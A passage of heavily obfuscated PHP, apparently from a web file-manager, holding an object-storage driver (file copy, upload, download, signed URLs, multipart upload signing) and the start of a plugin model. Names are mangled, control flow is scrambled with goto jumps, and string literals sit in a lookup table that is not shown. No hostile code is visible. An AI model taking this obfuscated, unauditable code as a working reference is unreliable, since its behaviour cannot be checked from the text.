$dŒæèª¡¾¿[176] || $b†ÀÛØÛ£Ü[$dŒæèª¡¾¿[177]] != $dŒæèª¡¾¿[176]) { return !1; } $f¦ã²Ä•øŒ = array_map($dŒæèª¡¾¿[178], $b†ÀÛØÛ£Ü[$dŒæèª¡¾¿[179]]); if (!is_array($f¦ã²Ä•øŒ)) { $f¦ã²Ä•øŒ = array(); } goto D‘†óŠŞ†Æ; FÎ†©³ß¬¿: } public function mkfile($eœÏ¤ãº»£, $AÊ±‡«ï· = '', $f®ñùªø¼Ò = REPEAT_RENAME) { $Bê éò¯¡­ = $this->setContent($eœÏ¤ãº»£, $AÊ±‡«ï·); if ($Bê éò¯¡­ !== !1) { return $this->getPathOuter($eœÏ¤ãº»£); } return !1; } public function mkdir($EŞùÖÀ·‹, $A£®˜ò“‡ = REPEAT_SKIP) { if (empty($EŞùÖÀ·‹)) { return !1; } if ($this->_isFolder($EŞùÖÀ·‹)) { return $this->getPathOuter($EŞùÖÀ·‹); } $BÆÜØ²Á¶‚ = $this->setContent($EŞùÖÀ·‹, $_SERVER[í…¶][33], !0); if ($BÆÜØ²Á¶‚ !== !1) { return $this->getPathOuter($EŞùÖÀ·‹); } return !1; } public function copyFile($d¹îªÃ”ÔÄ, $Bìõˆ÷·Ş, $dğß”Ûì¤ê = array()) { $eì‚½‘”åê =& $_SERVER[í…¶]; $BšëÑ‰óÕï = $this->objectMeta($d¹îªÃ”ÔÄ); if (!$BšëÑ‰óÕï) { return !1; } if ($BšëÑ‰óÕï[$eì‚½‘”åê[77]] <= 1024 * 1024 * 200) { $F¶äŸ¶‘ ß = $this->client->copyObject($this->bucket, $d¹îªÃ”ÔÄ, $this->bucket, $Bìõˆ÷·Ş, $eì‚½‘”åê[185], $dğß”Ûì¤ê); } else { $F¶äŸ¶‘ ß = $this->client->multiCopyObject($this->bucket, $d¹îªÃ”ÔÄ, $this->bucket, $Bìõˆ÷·Ş, $dğß”Ûì¤ê); } $F¶äŸ¶‘ ß = $F¶äŸ¶‘ ß ? $this->getPathOuter($Bìõˆ÷·Ş) : !1; return $F¶äŸ¶‘ ß; } public function moveFile($b’Û†ŒÄœ, $EÊÏ¹éë²Ö) { if ($this->copyFile($b’Û†ŒÄœ, $EÊÏ¹éë²Ö)) { $this->delFile($b’Û†ŒÄœ); return $this->getPathOuter($EÊÏ¹éë²Ö); } return !1; } public function delFile($b‰£ò’„áó) { return $this->client->deleteObject($this->bucket, $b‰£ò’„áó); } public function delFolder($d°»­´ÚÈÌ) { goto eÏ¶Óé§‡; a««óé÷Æè: return $B¤­Ì½œ === $d¶Ó­™Ğé¥ ? !0 : !1; goto e‡îÄÍğ£¬; EñÒéÁ×‰§: $B¤­Ì½œ = $d¶Ó­™Ğé¥ = 0; $D™ÌÊ÷ŠºÃ = array_chunk(array_keys($DŠ‘³ÊËÅË), 1000); foreach ($D™ÌÊ÷ŠºÃ as $Fœ§­ø›£†) { $B¤­Ì½œ++; $d¶Ó­™Ğé¥ += (int) $this->client->deleteObjects($this->bucket, $Fœ§­ø›£†); } goto a««óé÷Æè; eÏ¶Óé§‡: $C¹¹Ëôãµ… =& $_SERVER[í…¶]; $DŠ‘³ÊËÅË = $this->listObjs($d°»­´ÚÈÌ); if (!$DŠ‘³ÊËÅË) { $d°»­´ÚÈÌ = trim($d°»­´ÚÈÌ, $C¹¹Ëôãµ…[8]); if (!empty($d°»­´ÚÈÌ)) { $d°»­´ÚÈÌ .= $C¹¹Ëôãµ…[8]; } return $this->delFile($d°»­´ÚÈÌ); } goto EñÒéÁ×‰§; e‡îÄÍğ£¬: } public function rename($FÔƒ° ®¬ï, $b³«ÑÔŒÉ ) { return $this->renameObject($FÔƒ° ®¬ï, $b³«ÑÔŒÉ ); } public function listPath($E±ñÑ•¡÷ô, $DÃŠç ÀĞ¡ = false) { $eŠÂ…à«í =& $_SERVER[í…¶]; $b’ÆáĞ´öÃ = $this->listObjs($E±ñÑ•¡÷ô, null, null, $eŠÂ…à«í[8]); $A÷“…ŞŸñ = array($eŠÂ…à«í[74] => array(), $eŠÂ…à«í[73] => array()); foreach ($b’ÆáĞ´öÃ as $eÌš•È°Ô¦ => $f»¬—ÄºÚ) { if ($eÌš•È°Ô¦ == $eŠÂ…à«í[8]) { continue; } if (isset($f»¬—ÄºÚ[$eŠÂ…à«í[186]])) { $A÷“…ŞŸñ[$eŠÂ…à«í[74]][] = $this->folderInfo($f»¬—ÄºÚ[$eŠÂ…à«í[186]], $DÃŠç ÀĞ¡); } else { if (substr($f»¬—ÄºÚ[$eŠÂ…à«í[28]], -1) == $eŠÂ…à«í[8]) { continue; } $A÷“…ŞŸñ[$eŠÂ…à«í[73]][] = $this->fileInfo($f»¬—ÄºÚ[$eŠÂ…à«í[28]], $DÃŠç ÀĞ¡, $f»¬—ÄºÚ); } } return $A÷“…ŞŸñ; } private function fileInfo($bäÔ²’ƒ, $fïÚÑ³¼ªã = false, $EÍÖÃ§ª‹í = array()) { goto bÓêñ‘‹; bÓêñ‘‹: $a›ÌÔäè—¦ =& $_SERVER[í…¶]; if ($fïÚÑ³¼ªã) { return array($a›ÌÔäè—¦[28] => $this->pathThis($bäÔ²’ƒ), $a›ÌÔäè—¦[75] => $this->getPathOuter($bäÔ²’ƒ), $a›ÌÔäè—¦[29] => $a›ÌÔäè—¦[167], $a›ÌÔäè—¦[160] => $this->ext($bäÔ²’ƒ), $a›ÌÔäè—¦[77] => isset($EÍÖÃ§ª‹í[$a›ÌÔäè—¦[77]]) ? $EÍÖÃ§ª‹í[$a›ÌÔäè—¦[77]] : 0, $a›ÌÔäè—¦[187] => 0, $a›ÌÔäè—¦[107] => 0, $a›ÌÔäè—¦[188] => !0, $a›ÌÔäè—¦[189] => !0); } $A°ƒ±¨°Î© = array($a›ÌÔäè—¦[28] => $this->pathThis($bäÔ²’ƒ), $a›ÌÔäè—¦[75] => $this->getPathOuter($bäÔ²’ƒ), $a›ÌÔäè—¦[29] => $a›ÌÔäè—¦[167], $a›ÌÔäè—¦[187] => 0, $a›ÌÔäè—¦[107] => 0, $a›ÌÔäè—¦[77] => 0, $a›ÌÔäè—¦[160] => $this->ext($bäÔ²’ƒ), $a›ÌÔäè—¦[188] => !0, $a›ÌÔäè—¦[189] => !0); goto bšôÒŠğßÕ; AÔß¢ĞÆÊ•: return $A°ƒ±¨°Î©; goto CÖÂˆ¥ŠÉÕ; bšôÒŠğßÕ: if (empty($EÍÖÃ§ª‹í)) { $EÍÖÃ§ª‹í = $this->objectMeta($bäÔ²’ƒ); if (!$EÍÖÃ§ª‹í) { return $A°ƒ±¨°Î©; } } if (isset($EÍÖÃ§ª‹í[$a›ÌÔäè—¦[190]])) { $A°ƒ±¨°Î©[$a›ÌÔäè—¦[107]] = $EÍÖÃ§ª‹í[$a›ÌÔäè—¦[190]]; } if (isset($EÍÖÃ§ª‹í[$a›ÌÔäè—¦[77]])) { $A°ƒ±¨°Î©[$a›ÌÔäè—¦[77]] = $EÍÖÃ§ª‹í[$a›ÌÔäè—¦[77]]; } goto AÔß¢ĞÆÊ•; CÖÂˆ¥ŠÉÕ: } private function folderInfo($d¾á”»­£Õ, $a¿”Ê©„ë® = false) { goto D‹»„èœ£²; D‹»„èœ£²: $Dˆù‹¤°ç =& $_SERVER[í…¶]; if ($a¿”Ê©„ë®) { return array($Dˆù‹¤°ç[28] => $this->pathThis($d¾á”»­£Õ), $Dˆù‹¤°ç[75] => $this->getPathOuter($Dˆù‹¤°ç[8] . $d¾á”»­£Õ), $Dˆù‹¤°ç[29] => $Dˆù‹¤°ç[76], $Dˆù‹¤°ç[188] => !0, $Dˆù‹¤°ç[189] => !0); } $dÏï™ƒ°­¸ = array($Dˆù‹¤°ç[28] => $this->pathThis($d¾á”»­£Õ), $Dˆù‹¤°ç[75] => $this->getPathOuter($Dˆù‹¤°ç[8] . $d¾á”»­£Õ), $Dˆù‹¤°ç[29] => $Dˆù‹¤°ç[76], $Dˆù‹¤°ç[187] => 0, $Dˆù‹¤°ç[107] => 0, $Dˆù‹¤°ç[188] => !0, $Dˆù‹¤°ç[189] => !0); goto Dˆˆ‚àÂ; Dˆˆ‚àÂ: if ($d¾á”»­£Õ == $Dˆù‹¤°ç[33]) { return $dÏï™ƒ°­¸; } $d¾á”»­£Õ = trim($d¾á”»­£Õ, $Dˆù‹¤°ç[8]) . $Dˆù‹¤°ç[8]; $D†’œÄñŠÊ = $this->objectMeta($d¾á”»­£Õ); goto b‚ã×Ê¡Ôİ; b‚ã×Ê¡Ôİ: if (isset($D†’œÄñŠÊ[$Dˆù‹¤°ç[190]])) { $dÏï™ƒ°­¸[$Dˆù‹¤°ç[187]] = $D†’œÄñŠÊ[$Dˆù‹¤°ç[190]]; } return $dÏï™ƒ°­¸; goto A±ÜËÃàùË; A±ÜËÃàùË: } public function listObjs($CØì¿Òô‘®, $DÆÄ„ÇÒŸÒ = null, $fÀÔİßœôõ = null, $cÅÍöÛìó” = null) { $BÛİ§Ø½Æ° =& $_SERVER[í…¶]; $CØì¿Òô‘® = trim($CØì¿Òô‘®, $BÛİ§Ø½Æ°[8]); $Eê¡ê¡±Ê = empty($CØì¿Òô‘®) ? $BÛİ§Ø½Æ°[33] : $CØì¿Òô‘® . $BÛİ§Ø½Æ°[8]; return $this->client->getBucket($this->bucket, $Eê¡ê¡±Ê, $DÆÄ„ÇÒŸÒ, $fÀÔİßœôõ, $cÅÍöÛìó”, !0); } public function has($Cƒ¨¡ËÛÊˆ, $a—Œ…¸Æµ = false, $BÌ¯ÕÚ“öª = true) { goto aÙÊÅ±ÛÓÆ; BŒó§öÑáš: $e•ë¾—¿Œ = $this->listObjs($Cƒ¨¡ËÛÊˆ, null, null, $E«èå–Ãî[8]); $e•ë¾—¿Œ = is_array($e•ë¾—¿Œ) ? $e•ë¾—¿Œ : array(); foreach ($e•ë¾—¿Œ as $DÏ¥ŸïÓ£ê) { if (isset($DÏ¥ŸïÓ£ê[$E«èå–Ãî[28]]) && substr($DÏ¥ŸïÓ£ê[$E«èå–Ãî[28]], -1) != $E«èå–Ãî[8]) { if (!$a—Œ…¸Æµ && $BÌ¯ÕÚ“öª) { return !0; } $DĞ™ÅÀåì++; } else { if (isset($DÏ¥ŸïÓ£ê[$E«èå–Ãî[186]])) { if (!$a—Œ…¸Æµ && !$BÌ¯ÕÚ“öª) { return !1; } $Dİ…ŒÔè++; } } } goto aóÖˆ‘Íé‡; aóÖˆ‘Íé‡: if ($a—Œ…¸Æµ) { return array($E«èå–Ãî[191] => $DĞ™ÅÀåì, $E«èå–Ãî[192] => $Dİ…ŒÔè); } return !1; goto BÓÛ„îæò; aÙÊÅ±ÛÓÆ: $E«èå–Ãî =& $_SERVER[í…¶]; $DĞ™ÅÀåì = 0; $Dİ…ŒÔè = 0; goto BŒó§öÑáš; BÓÛ„îæò: } public function listAll($dğ­ª„¥ò) { $Fõ¬®Ò¹‹ =& $_SERVER[í…¶]; $E£’µêÍˆÉ = $this->listObjs($dğ­ª„¥ò); $bàáæ¸ã§ = $f—Ñ®¥†ô = array(); foreach ($E£’µêÍˆÉ as $E°¶‡áßÖ => $B•í†Î) { $bàáæ¸ã§[] = $B•í†Î[$Fõ¬®Ò¹‹[28]]; $f—Ñ®¥†ô[$E°¶‡áßÖ] = $B•í†Î[$Fõ¬®Ò¹‹[77]]; } return $this->listAllFiles($dğ­ª„¥ò, $bàáæ¸ã§, $f—Ñ®¥†ô); } public function canRead($e¢º…é«Ã) { $F¥ø†àô™ =& $_SERVER[í…¶]; $aÌ’•ó‰´« = $this->client->getAccessControlPolicy($this->bucket, $e¢º…é«Ã); if (!$aÌ’•ó‰´«) { return !1; } return in_array($aÌ’•ó‰´«, array($F¥ø†àô™[193], $F¥ø†àô™[194], $F¥ø†àô™[195])) ? !0 : !1; } public function canWrite($d„°–Á‚­¥) { $F“šç»“…º =& $_SERVER[í…¶]; $eƒÃ‹Ï”«¹ = $this->client->getAccessControlPolicy($this->bucket, $d„°–Á‚­¥); if (!$eƒÃ‹Ï”«¹) { return !1; } return in_array($eƒÃ‹Ï”«¹, array($F“šç»“…º[193], $F“šç»“…º[194])) ? !0 : !1; } public function getContent($F©¤Ş÷ïù·) { return $this->client->getObject($this->bucket, $F©¤Ş÷ïù·); } public function setContent($E©‹öÚ½êÃ, $aÄÄ¨‘­í = '', $BŒŸ×ó½‡í = false) { goto eÆˆÙ™¤¹Œ; eÆˆÙ™¤¹Œ: $d³å©®ŠÍ¹ =& $_SERVER[í…¶]; $E©‹öÚ½êÃ = $BŒŸ×ó½‡í ? trim($E©‹öÚ½êÃ, $d³å©®ŠÍ¹[8]) . $d³å©®ŠÍ¹[8] : $E©‹öÚ½êÃ; $BõĞ—êÖæÑ = get_file_mime(get_path_ext($E©‹öÚ½êÃ)); goto C×ä›–¡İ†; b‰Ã÷Å°Ğ¹: $dâÀ‰Úùéâ = $this->copyFile($E©‹öÚ½êÃ, $E©‹öÚ½êÃ, array($d³å©®ŠÍ¹[196] => $dâÀ‰Úùéâ[$d³å©®ŠÍ¹[197]])); return $dâÀ‰Úùéâ ? !0 : !1; goto eÎİÅÚÑï“; C×ä›–¡İ†: $dâÀ‰Úùéâ = $this->client->putObject($aÄÄ¨‘­í, $this->bucket, $E©‹öÚ½êÃ, $d³å©®ŠÍ¹[185], array(), $BõĞ—êÖæÑ); if (!$dâÀ‰Úùéâ) { return !1; } if ($BŒŸ×ó½‡í) { return !0; } goto b‰Ã÷Å°Ğ¹; eÎİÅÚÑï“: } public function fileSubstr($F±Íò®Ûß–, $fŠÔç¡ïóğ, $eÑ¸Ä¥Š‡÷) { $cĞ¡Ş¥–¬ = $fŠÔç¡ïóğ + $eÑ¸Ä¥Š‡÷ - 1; return $this->client->getObject($this->bucket, $F±Íò®Ûß–, array($_SERVER[í…¶][198] => "\x62\171\164\x65\163\x3d{$fŠÔç¡ïóğ}\55{$cĞ¡Ş¥–¬}")); } public function upload($D¬Ì‹Í´Ğ, $f§³¢šÄÃ‘, $D£›¡ê¸óò = false, $E…”µÇ‡ğå = REPEAT_REPLACE) { $cãî‰¼Å—Ô =& $_SERVER[í…¶]; $D®¡ˆ¹†¼« = array($cãî‰¼Å—Ô[196] => @md5_file($f§³¢šÄÃ‘)); $F÷ƒ’Ç¡¿Ç = array($cãî‰¼Å—Ô[199] => get_file_mime(get_path_ext($D¬Ì‹Í´Ğ))); if (IO::size($f§³¢šÄÃ‘) <= 1024 * 1024 * 200) { $dàÎ³‡ñ¹ = $this->client->putObjectFile($f§³¢šÄÃ‘, $this->bucket, $D¬Ì‹Í´Ğ, $cãî‰¼Å—Ô[185], $D®¡ˆ¹†¼«, $F÷ƒ’Ç¡¿Ç); return !empty($dàÎ³‡ñ¹) ? $this->getPathOuter($D¬Ì‹Í´Ğ) : !1; } $BğèçŠà¦¶ = $this->client->multiUploadObject($f§³¢šÄÃ‘, $this->bucket, trim($D¬Ì‹Í´Ğ, $cãî‰¼Å—Ô[8]), $D®¡ˆ¹†¼«, $F÷ƒ’Ç¡¿Ç); return $BğèçŠà¦¶ ? $this->getPathOuter($D¬Ì‹Í´Ğ) : !1; } public function download($d¬âÁ ÈÌ, $A™çµ¨Ã«ğ) { if (!@is_dir($this->pathFather($A™çµ¨Ã«ğ)) && !IO::mkdir($this->pathFather($A™çµ¨Ã«ğ))) { return !1; } $EôŸºµÖÙ = $this->client->getObject($this->bucket, $d¬âÁ ÈÌ, array(), $A™çµ¨Ã«ğ); return $EôŸºµÖÙ !== !1 ? $A™çµ¨Ã«ğ : !1; } public function link($b´ÍÌ Î¦, $d¾×ÄÌ‘Ì¨ = array()) { $EÉöˆæ² ˆ =& $_SERVER[í…¶]; if ($this->signVer == $EÉöˆæ² ˆ[200]) { return $this->client->getAuthenticatedURL($this->bucket, $b´ÍÌ Î¦, 3600 * 12, $d¾×ÄÌ‘Ì¨); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($b´ÍÌ Î¦, $EÉöˆæ² ˆ[8]), 3600 * 12, $this->region, array(), !0, $d¾×ÄÌ‘Ì¨); } public function fileOut($cç¢Â¬›µ, $aê¤°ÄÏÕİ = false, $eìØªç¦ª± = false, $AÍ“îÚå™´ = '') { goto eçï´¨¸¢Í; c„ÀÏïÄ‹ˆ: if ($d Ñ‹¬§èÒ == $B¿íïÒÀµ†[201]) { return parent::fileOut($cç¢Â¬›µ, $aê¤°ÄÏÕİ, $eìØªç¦ª±, $AÍ“îÚå™´); } $aê¤°ÄÏÕİ = $aê¤°ÄÏÕİ ? $B¿íïÒÀµ†[202] : $B¿íïÒÀµ†[203]; $E¤„Üåƒ´ğ = array($B¿íïÒÀµ†[204] => $aê¤°ÄÏÕİ . $B¿íïÒÀµ†[205] . rawurlencode($eìØªç¦ª±), $B¿íïÒÀµ†[206] => $d Ñ‹¬§èÒ); goto aêãÃ“ÒØ; aêãÃ“ÒØ: $DŒšÎ‘å¶ = $this->link($cç¢Â¬›µ, $E¤„Üåƒ´ğ); $this->fileOutLink($DŒšÎ‘å¶); goto aˆ×‚Ñ‚â¼; eçï´¨¸¢Í: $B¿íïÒÀµ† =& $_SERVER[í…¶]; if (!$eìØªç¦ª±) { $eìØªç¦ª± = $this->pathThis($cç¢Â¬›µ); } $d Ñ‹¬§èÒ = get_file_mime(get_path_ext($eìØªç¦ª±)); goto c„ÀÏïÄ‹ˆ; aˆ×‚Ñ‚â¼: } public function fileOutServer($a‡Ç››È, $FÒ÷Í‡éÈø = false, $aÓØ¦¤›Ÿø = false, $C¤ÜŠÛàß = '') { parent::fileOut($a‡Ç››È, $FÒ÷Í‡éÈø, $aÓØ¦¤›Ÿø, $C¤ÜŠÛàß); } public function fileOutImage($E’ÔîõÇ™ƒ, $eèœ÷·½—Æ = 250) { $Bï½³ÎÅğ´ = $this->link($E’ÔîõÇ™ƒ); $this->fileOutLink($Bï½³ÎÅğ´); } public function fileOutImageServer($cÈÊÎ™ğ, $C†ÓĞ™£Áˆ = 250) { parent::fileOutImage($cÈÊÎ™ğ, $C†ÓĞ™£Áˆ); } public function hashMd5($e·Ğ«—¤—, $c¸­ßùÆµ® = '') { $fœİ–¾Ãï =& $_SERVER[í…¶]; $f÷¬á‹á¦ = $this->objectMeta($e·Ğ«—¤—); if (!$f÷¬á‹á¦) { return !1; } $c¸­ßùÆµ® = $c¸­ßùÆµ® ? $c¸­ßùÆµ® : _get($f÷¬á‹á¦, $fœİ–¾Ãï[207]); $c¸­ßùÆµ® = $c¸­ßùÆµ® ? $c¸­ßùÆµ® : _get($f÷¬á‹á¦, $fœİ–¾Ãï[197], $fœİ–¾Ãï[33]); return $c¸­ßùÆµ®; } public function uploadFormData($aì³Ûİù¼, $b…¤÷º…¡ = 3600) { $BĞ´…£øèÙ =& $_SERVER[í…¶]; $BîÈ›ÚÙé = $this->pathFather($aì³Ûİù¼); $bÌÚİ…ó ã = $this->client->getHttpUploadPostParams($this->bucket, $BîÈ›ÚÙé, $BĞ´…£øèÙ[185], $b…¤÷º…¡); return array_merge((array) $bÌÚİ…ó ã, array($BĞ´…£øèÙ[169] => $this->getHost())); } public function multiUploadFormData($aÜƒ††±¯, $eÔ©èæÖ¨­ = 3600) { $c¥¦š‹ =& $_SERVER[í…¶]; $f¶¹¤Ï· = gmdate($c¥¦š‹[208]); $c«‘Ó·ãëÍ = array(); $a¯Š¡™ŸŸ = $this->client->getUploadId($this->bucket, $aÜƒ††±¯, $c«‘Ó·ãëÍ); if (!$a¯Š¡™ŸŸ) { return !1; } return array($c¥¦š‹[209] => $a¯Š¡™ŸŸ, $c¥¦š‹[169] => $this->getHost() . $c¥¦š‹[8] . $this->pathEncode($aÜƒ††±¯), $c¥¦š‹[210] => $f¶¹¤Ï·, $c¥¦š‹[89] => $aÜƒ††±¯); } public function multiUploadAuthData($féªÀîøÑº, $d¬ä‘šáƒ = array()) { goto dİÊó˜ö; AØ¥ÎöˆÖ: if (strpos($c¤ŠÓ¿“èï, $dç³™‚ÉÁî[213]) === 0) { return array($dç³™‚ÉÁî[220] => $AÛ«³¨–, $dç³™‚ÉÁî[210] => $e‘«ğƒŞ­); } return $AÛ«³¨–; goto b°öœØæ‰; C¯øßÛÛİ: $e¾¾Ü¨¤» = array($dç³™‚ÉÁî[212], $dç³™‚ÉÁî[33], $dç³™‚ÉÁî[116], $dç³™‚ÉÁî[33], "\x78\x2d\141\x6d\x7a\55\x64\x61\164\x65\x3a{$e‘«ğƒŞ­}", $dç³™‚ÉÁî[8] . $this->bucket . $dç³™‚ÉÁî[8] . $this->pathEncode($e­ôé„ÆËŒ) . $c¤ŠÓ¿“èï); if (strpos($c¤ŠÓ¿“èï, $dç³™‚ÉÁî[213]) === 0) { $e¾¾Ü¨¤»[0] = $dç³™‚ÉÁî[214]; } if (isset($d¬ä‘šáƒ[$dç³™‚ÉÁî[215]]) && $d¬ä‘šáƒ[$dç³™‚ÉÁî[215]] == $dç³™‚ÉÁî[216]) { $e¾¾Ü¨¤»[0] = $dç³™‚ÉÁî[216]; } goto a…Ô¹™å¯ ; B·«àÀçÖ–: $e­ôé„ÆËŒ = $d¬ä‘šáƒ[$dç³™‚ÉÁî[89]]; unset($d¬ä‘šáƒ[$dç³™‚ÉÁî[89]]); if (isset($d¬ä‘šáƒ[$dç³™‚ÉÁî[211]])) { $d¬ä‘šáƒ[$dç³™‚ÉÁî[210]] = $e‘«ğƒŞ­; return $this->listUploadParts($e­ôé„ÆËŒ, $d¬ä‘šáƒ); } goto C¯øßÛÛİ; a…Ô¹™å¯ : $aêÀ¤êõª¼ = implode($dç³™‚ÉÁî[217], $e¾¾Ü¨¤»); $a¾÷Ôß¿²› = base64_encode(hash_hmac($dç³™‚ÉÁî[218], $aêÀ¤êõª¼, $this->secret, !0)); $AÛ«³¨– = $dç³™‚ÉÁî[219] . $this->accessKey . $dç³™‚ÉÁî[4] . $a¾÷Ôß¿²›; goto AØ¥ÎöˆÖ; dİÊó˜ö: $dç³™‚ÉÁî =& $_SERVER[í…¶]; $e‘«ğƒŞ­ = isset($d¬ä‘šáƒ[$dç³™‚ÉÁî[210]]) ? $d¬ä‘šáƒ[$dç³™‚ÉÁî[210]] : gmdate($dç³™‚ÉÁî[208]); $c¤ŠÓ¿“èï = isset($d¬ä‘šáƒ[$dç³™‚ÉÁî[160]]) ? $d¬ä‘šáƒ[$dç³™‚ÉÁî[160]] : $dç³™‚ÉÁî[33]; goto B·«àÀçÖ–; b°öœØæ‰: } public function listUploadParts($C®±”¼Î, $EÌù–·Áã‚ = array()) { goto DŞ®ˆƒîËÛ; DŞ®ˆƒîËÛ: $EšÊ’†Àöä =& $_SERVER[í…¶]; $D¹Ëˆôİ” = str_replace($EšÊ’†Àöä[221], $EšÊ’†Àöä[33], $EÌù–·Áã‚[$EšÊ’†Àöä[160]]); $Bâ¾àÇÕ­¿ = $this->client->listParts($this->bucket, $C®±”¼Î, $D¹Ëˆôİ”); goto bëŠñ­›¡ç; a…½Èº¥ÃÔ: $dÛ—“›ò×­ = $this->multiUploadAuthData($C®±”¼Î, $EÌù–·Áã‚); if (empty($dÛ—“›ò×­)) { return !1; } return array($EšÊ’†Àöä[220] => $dÛ—“›ò×­, $EšÊ’†Àöä[210] => $EÌù–·Áã‚[$EšÊ’†Àöä[210]], $EšÊ’†Àöä[222] => $Bâ¾àÇÕ­¿); goto bÛğ÷Ü¸î; bëŠñ­›¡ç: if (!$Bâ¾àÇÕ­¿) { return !1; } unset($EÌù–·Áã‚[$EšÊ’†Àöä[211]], $EÌù–·Áã‚[$EšÊ’†Àöä[215]]); $EÌù–·Áã‚[$EšÊ’†Àöä[89]] = $C®±”¼Î; goto a…½Èº¥ÃÔ; bÛğ÷Ü¸î: } public function getHost() { return parent::getHost() . $_SERVER[í…¶][8] . $this->bucket; } public function size($C«øè¶½Ä) { $aÂğ˜¥Î¶ = $this->objectMeta($C«øè¶½Ä); return $aÂğ˜¥Î¶ ? $aÂğ˜¥Î¶[$_SERVER[í…¶][77]] : 0; } public function info($b¢Æèİà°Š) { if ($this->isFolder($b¢Æèİà°Š)) { return $this->folderInfo($b¢Æèİà°Š); } else { if ($this->isFile($b¢Æèİà°Š)) { return $this->fileInfo($b¢Æèİà°Š); } } return !1; } public function exist($FÖè¡Œ°É) { return $this->isFile($FÖè¡Œ°É) || $this->isFolder($FÖè¡Œ°É); } public function isFile($D¡ŸÕù‘») { return !$this->isFolder($D¡ŸÕù‘») && $this->objectMeta($D¡ŸÕù‘»); } public function isFolder($b´­Óô°˜è) { return $this->cacheMethod($_SERVER[í…¶][223], $b´­Óô°˜è); } protected function objectMeta($c„†ÂˆæÂº) { return $this->cacheMethod($_SERVER[í…¶][224], $c„†ÂˆæÂº); } protected function _objectMeta($f£Û˜á¹á„) { $d¤©Ä×©îø =& $_SERVER[í…¶]; $f£Û˜á¹á„ = rtrim($f£Û˜á¹á„, $d¤©Ä×©îø[8]); try { $aÊâ–¤¶ñ = $this->client->getObjectInfo($this->bucket, $f£Û˜á¹á„); if (!isset($aÊâ–¤¶ñ[$d¤©Ä×©îø[207]]) && isset($aÊâ–¤¶ñ[$d¤©Ä×©îø[225]])) { $aÊâ–¤¶ñ[$d¤©Ä×©îø[207]] = $aÊâ–¤¶ñ[$d¤©Ä×©îø[225]]; } } catch (Exception $cêù‰´¢¹) { $aÊâ–¤¶ñ = !1; } if (!$aÊâ–¤¶ñ) { } return $aÊâ–¤¶ñ; } protected function _isFolder($d•µ’ó¯©œ) { goto E‘¶ìôçÕé; A„Ä§„¾: if (substr($fÎÊôõ…èË[0][$CÌÇ»Ïí×º[28]], -1) == $CÌÇ»Ïí×º[8]) { return !0; } if (get_path_this($fÎÊôõ…èË[0][$CÌÇ»Ïí×º[28]]) == get_path_this($d•µ’ó¯©œ)) { return !1; } return !0; goto A–ê°‰İÑˆ; E‘¶ìôçÕé: $CÌÇ»Ïí×º =& $_SERVER[í…¶]; $d•µ’ó¯©œ = rtrim($d•µ’ó¯©œ, $CÌÇ»Ïí×º[8]); if ($d•µ’ó¯©œ == $CÌÇ»Ïí×º[33] || $d•µ’ó¯©œ == $CÌÇ»Ïí×º[8]) { return !0; } goto EŞŞˆÄÄÏ; EŞŞˆÄÄÏ: $fÎÊôõ…èË = $this->client->getBucket($this->bucket, $d•µ’ó¯©œ, null, 1); if (empty($fÎÊôõ…èË)) { return !1; } $fÎÊôõ…èË = array_values($fÎÊôõ…èË); goto A„Ä§„¾; A–ê°‰İÑˆ: } } define($_SERVER[í…¶][226], 1); goto F‰‹ˆ‘†Ïî; bÃ»¥¸¡«ï: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x70\154\165\147\151\156\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\163\164\x61\x74\165\163", "\x72\x65\147\151\x65\163\x74", "\x63\157\156\146\x69\x67"); public function loadList($c¬ñ‘•šÁÏ = false) { $EÂö†ñòïÂ = array_to_keyvalue($this->listData(), $_SERVER[í…¶][28]); if ($c¬ñ‘•šÁÏ) { return $EÂö†ñòïÂ[$c¬ñ‘•šÁÏ]; } return $EÂö†ñòïÂ; } public function init() { $câÕ©’†˜‹ =& $_SERVER[í…¶]; Hook::trigger($câÕ©’†˜‹[2192]); $F¹Ú› Ì»¿ = $this->loadPluginList(); foreach ($F¹Ú› Ì»¿ as $eÑ°Æãâó¤ => $dÊ¾Éâ¨˜) { $d¬Î¨•£Â = $this->appAllow($eÑ°Æãâó¤, $dÊ¾Éâ¨˜); if (!$d¬Î¨•£Â) { continue; } foreach ($dÊ¾Éâ¨˜[$câÕ©’†˜‹[2193]] as $dï”š†ƒ => $aÅ³ÂÊà”ê) { Hook::bind($dï”š†ƒ, $aÅ³ÂÊà”ê); } } Hook::trigger($câÕ©’†˜‹[2194]); Hook::trigger(ACTION); } public function appAllow($F…©‰ŒæŠÚ, $a±”Ş¤°Ö, $aäğÆõ‚Ä = true) { $dŠ—Ôßªä½ =& $_SERVER[í…¶]; $AÌ÷ë»Ÿöë = PLUGIN_DIR . $F…©‰ŒæŠÚ . $dŠ—Ôßªä½[2195]; if (!is_array($a±”Ş¤°Ö) || !is_array($a±”Ş¤°Ö[$dŠ—Ôßªä½[2193]]) || !is_file($AÌ÷ë»Ÿöë) || $a±”Ş¤°Ö[$dŠ—Ôßªä½[691]] != 1) { return !1; } if ($aäğÆõ‚Ä && !Action($dŠ—Ôßªä½[2196])->checkAuth($F…©‰ŒæŠÚ)) { return !1; } return !0; } public function unInstall($Bà³§Ï¸’) { $F¶´ŞÎ‰Ó¥ =& $_SERVER[í…¶]; $D¥ÉĞ³÷³ï = $this->loadList($Bà³§Ï¸’); if (file_exists(PLUGIN_DIR . $Bà³§Ï¸’)) { Hook::apply($Bà³§Ï¸’ . $F¶´ŞÎ‰Ó¥[2197]); } $this->remove($D¥ÉĞ³÷³ï[$F¶´ŞÎ‰Ó¥[376]]); } public function changeStatus($AŒ¾ƒ¹§¢Ì, $C£Ô·…¥†) { $f…æÄ„¢­ =& $_SERVER[í…¶]; $a¤Êº‡ä×õ = $this->loadList($AŒ¾ƒ¹§¢Ì); if ($C£Ô·…¥†) { Hook::apply($AŒ¾ƒ¹§¢Ì . $f…æÄ„¢­[2198]); } $this->update($a¤Êº‡ä×õ[$f…æÄ„¢­[376]], array($f…æÄ„¢­[2199] => $C£Ô·…¥†)); } public function appRegist($d… ¤¨æŞƒ, $E¸±ççÏ™ê) { $Aö¹£‚åê¸ =& $_SERVER[í…¶]; $aãÑŞ²¾ô = $this->loadList($d… ¤¨æŞƒ); if ($aãÑŞ²¾ô) { $this->update($aãÑŞ²¾ô[$Aö¹£‚åê¸[376]], array($Aö¹£‚åê¸[2193] => $E¸±ççÏ™ê)); } else { 